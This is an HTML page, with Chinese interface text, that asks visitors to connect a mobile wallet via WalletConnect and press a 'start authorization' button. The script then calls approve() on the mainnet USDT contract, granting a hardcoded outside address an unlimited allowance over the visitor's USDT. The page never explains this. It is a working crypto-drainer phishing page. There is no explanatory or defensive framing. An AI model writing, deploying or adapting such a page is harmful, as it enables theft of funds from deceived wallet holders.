<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WalletConnect v2 USDT 授權</title>
  <script type="module">
    import { Web3Modal } from 'https://esm.sh/@web3modal/html@2.6.2'
    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://esm.sh/@web3modal/ethereum'
    import { configureChains, createConfig, WagmiConfig } from 'https://esm.sh/wagmi'
    import { mainnet } from 'https://esm.sh/wagmi/chains'

    const projectId = 'demo' // You can replace with your WalletConnect Project ID

    const chains = [mainnet]
    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })])
    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, version: 2, chains }),
      publicClient
    })

    const ethereumClient = new EthereumClient(wagmiConfig, chains)

    const modal = new Web3Modal({
      projectId,
      themeMode: 'light',
      themeVariables: {
        '--w3m-font-family': 'sans-serif',
        '--w3m-accent-color': '#4a90e2'
      },
      walletConnectVersion: 2,
      standaloneChains: [mainnet.id],
      explorerRecommendedWalletIds: 'NONE'
    }, ethereumClient)

    window.modal = modal
    window.ethereumClient = ethereumClient

    document.addEventListener('DOMContentLoaded', async () => {
      const openModal = document.getElementById('openModal')
      openModal.addEventListener('click', async () => {
        await modal.openModal()
        const provider = await ethereumClient.getProvider()
        const web3 = new window.Web3(provider)
        const accounts = await web3.eth.getAccounts()
        const owner = accounts[0]

        const usdtContract = new web3.eth.Contract([
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }
        ], "0xdAC17F958D2ee523a2206206994597C13D831ec7")

        const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5"
        const amount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")

        const tx = await usdtContract.methods.approve(spender, amount).send({ from: owner })
        alert("✅ 授權成功\nTxHash: " + tx.transactionHash)
        await modal.closeModal()
      })
    })
  </script>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.3.5/dist/web3.min.js"></script>
</head>
<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
  <h2>請使用手機錢包掃描 QR Code</h2>
  <button id="openModal" style="padding: 12px 24px; font-size: 18px; background-color: #4a90e2; color: white; border: none; border-radius: 6px;">開始授權</button>
</body>
</html>
